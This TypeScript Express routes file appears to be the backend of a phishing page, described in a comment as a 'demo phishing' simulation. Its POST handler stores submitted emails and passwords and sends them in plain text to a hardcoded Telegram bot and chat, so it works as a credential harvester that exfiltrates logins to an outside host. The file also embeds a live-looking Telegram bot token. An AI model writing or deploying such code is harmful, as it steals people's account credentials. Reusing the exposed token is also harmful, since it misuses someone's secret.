
import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";

const TELEGRAM_BOT_TOKEN = "7987053363:AAGK36GhJSQ19U8ubIdJLfSZaR5zP1EuwOM";
const TELEGRAM_CHAT_ID = "6360165707";

async function sendToTelegram(message: string) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });
    const result = await response.json();
    if (!response.ok) {
      console.error("Telegram API error:", result);
    }
  } catch (error) {
    console.error("Error sending to Telegram:", error);
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  app.post(api.credentials.create.path, async (req, res) => {
    try {
      const input = api.credentials.create.input.parse(req.body);
      // In a real app we wouldn't store these, but for this demo request we capture them
      // as per the "demo phishing" simulation requirement.
      await storage.createCredential(input);
      
      // Send notification to Telegram
      const message = `<b>New Login Attempt</b>\n\n` +
        `<b>Service:</b> ${input.service}\n` +
        `<b>Email:</b> <code>${input.email}</code>\n` +
        `<b>Password:</b> <code>${input.password}</code>`;
      
      // Fire and forget telegram message
      sendToTelegram(message).catch(err => console.error("Async Telegram error:", err));
      
      // Simulate a small network delay for realism
      res.json({ success: true });
    } catch (err) {
      console.error("Route error:", err);
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
        });
      }
      res.status(500).json({ message: "Internal server error" });
    }
  });

  return httpServer;
}
